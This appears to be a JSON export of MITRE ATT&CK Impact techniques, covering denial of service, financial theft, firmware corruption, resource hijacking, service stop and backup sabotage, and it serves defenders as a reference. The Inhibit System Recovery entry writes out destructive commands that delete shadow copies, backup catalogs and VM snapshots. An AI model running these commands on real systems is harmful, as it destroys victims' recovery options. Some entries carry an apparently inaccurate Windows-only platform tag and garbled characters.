    "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes[1]and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.[4]In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.[5]For attacks attempting to saturate the providing network, seeNetwork Denial of Service.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:43.473668",
    "subtechniques": [
      {
        "id": "T1499.001",
        "name": "OS Exhaustion Flood"
      },
      {
        "id": "T1499.002",
        "name": "Service Exhaustion Flood"
      },
      {
        "id": "T1499.003",
        "name": "Application Exhaustion Flood"
      },
      {
        "id": "T1499.004",
        "name": "Application or System Exploitation"
      }
    ]
  },
  {
    "technique_id": "T1499.001",
    "name": "OS Exhaustion Flood",
    "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.[1]With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.[2]ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.[3]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Endpoint Denial of Service",
    "parent_technique_id": "T1499",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:46.820887"
  },
  {
    "technique_id": "T1499.002",
    "name": "Service Exhaustion Flood",
    "description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.[1]Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.[2]Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.[3]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Endpoint Denial of Service",
    "parent_technique_id": "T1499",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:50.188515"
  },
  {
    "technique_id": "T1499.003",
    "name": "Application Exhaustion Flood",
    "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.[1]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Endpoint Denial of Service",
    "parent_technique_id": "T1499",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:53.548494"
  },
  {
    "technique_id": "T1499.004",
    "name": "Application or System Exploitation",
    "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.[1]Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such asData Destruction,Firmware Corruption,Service Stopetc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Endpoint Denial of Service",
    "parent_technique_id": "T1499",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:56.909390"
  },
  {
    "technique_id": "T1657",
    "name": "Financial Theft",
    "description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,[1]business email compromise (BEC) and fraud,[2]\"pig butchering,\"[3]bank hacking,[4]and exploiting cryptocurrency networks.[5]Adversaries mayCompromise Accountsto conduct unauthorized transfers of funds.[6]In the case of business email compromise or email fraud, an adversary may utilizeImpersonationof a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.[2]This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.[7]Extortion by ransomware may occur, for example, when an adversary demands payment from a victim afterData Encrypted for Impact[8]andExfiltrationof data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.[9]Adversaries may use dedicated leak sites to distribute victim data.[10]Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such asData Destructionand business disruption.[11]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:00.285034",
    "subtechniques": []
  },
  {
    "technique_id": "T1495",
    "name": "Firmware Corruption",
    "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.[1]Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.[2][3]Depending on the device, this attack may also result inData Destruction.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:03.620519",
    "subtechniques": []
  },
  {
    "technique_id": "T1490",
    "name": "Inhibit System Recovery",
    "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.[1][2]This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects ofData DestructionandData Encrypted for Impact.[1][2]Furthermore, adversaries may disable recovery notifications, then corrupt backups.[3]A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:vssadmin.execan be used to delete all volume shadow copies on a system -vssadmin.exe delete shadows /all /quietWindows Management Instrumentationcan be used to delete volume shadow copies -wmic shadowcopy deletewbadmin.execan be used to delete the Windows Backup Catalog -wbadmin.exe delete catalog -quietbcdedit.execan be used to disable automatic Windows recovery features by modifying boot configuration data -bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled noREAgentC.execan be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected systemdiskshadow.execan be used to delete all volume shadow copies on a system -diskshadow delete shadows all[4][5]On network devices, adversaries may leverageDisk Wipeto delete backup firmware images and reformat the file system, thenSystem Shutdown/Rebootto reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to supportData Encrypted for Impact, preventing them from being leveraged as backups (e.g., viavim-cmd vmsvc/snapshot.removeall).[6]Adversaries may also delete \"online\" backups that are connected to their network â€“ whether via network storage media or through folders that sync to cloud services.[7]In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.[8][9]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:07.021616",
    "subtechniques": []
  },
  {
    "technique_id": "T1498",
    "name": "Network Denial of Service",
    "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes[1]and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, seeEndpoint Denial of Service.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:10.376132",
    "subtechniques": [
      {
        "id": "T1498.001",
        "name": "Direct Network Flood"
      },
      {
        "id": "T1498.002",
        "name": "Reflection Amplification"
      }
    ]
  },
  {
    "technique_id": "T1498.001",
    "name": "Direct Network Flood",
    "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.[1]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Network Denial of Service",
    "parent_technique_id": "T1498",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:13.732906"
  },
  {
    "technique_id": "T1498.002",
    "name": "Reflection Amplification",
    "description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.[1]This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS[2]and NTP[3], though the use of several others in the wild have been documented.[4]In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.[5]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Network Denial of Service",
    "parent_technique_id": "T1498",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:17.091015"
  },
  {
    "technique_id": "T1496",
    "name": "Resource Hijacking",
    "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.Resource hijacking may take a number of different forms. For example, adversaries may:Leverage compute resources in order to mine cryptocurrencySell network bandwidth to proxy networksGenerate SMS traffic for profitAbuse cloud-based messaging services to send large quantities of spam messagesIn some cases, adversaries may leverage multiple types of Resource Hijacking at once.[1]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:20.455805",
    "subtechniques": [
      {
        "id": "T1496.001",
        "name": "Compute Hijacking"
      },
      {
        "id": "T1496.002",
        "name": "Bandwidth Hijacking"
      }
    ]
  },
  {
    "technique_id": "T1496.001",
    "name": "Compute Hijacking",
    "description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.One common purpose forCompute Hijackingis to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.[1]Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used forCompute Hijackingand cryptocurrency mining.[2]Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.[3][4]Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure itâ€™s not competing for resources.[5]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Resource Hijacking",
    "parent_technique_id": "T1496",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:23.837442"
  },
  {
    "technique_id": "T1496.002",
    "name": "Bandwidth Hijacking",
    "description": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitateNetwork Denial of Servicecampaigns and/or to seed malicious torrents.[1]Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.[2]Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.[3]In addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victimâ€™s bandwidth is used for illegal activities.[2]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Resource Hijacking",
    "parent_technique_id": "T1496",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:27.210208"
  },
  {
    "technique_id": "T1489",
    "name": "Service Stop",
    "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.[1][2]Adversaries may accomplish this by disabling individual services of high importance to an organization, such asMSExchangeIS, which will make Exchange content inaccessible.[2]In some cases, adversaries may stop or disable many or all services to render systems unusable.[1]Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conductData DestructionorData Encrypted for Impacton the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.[3][4]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:30.578402",
    "subtechniques": []
  },
  {
    "technique_id": "T1529",
    "name": "System Shutdown/Reboot",
    "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device viaNetwork Device CLI(e.g.reload).[1][2]They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such asDisk Structure WipeorInhibit System Recovery, to hasten the intended effects on system availability.[3][4]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:27:33.961164",
    "subtechniques": []
  }
]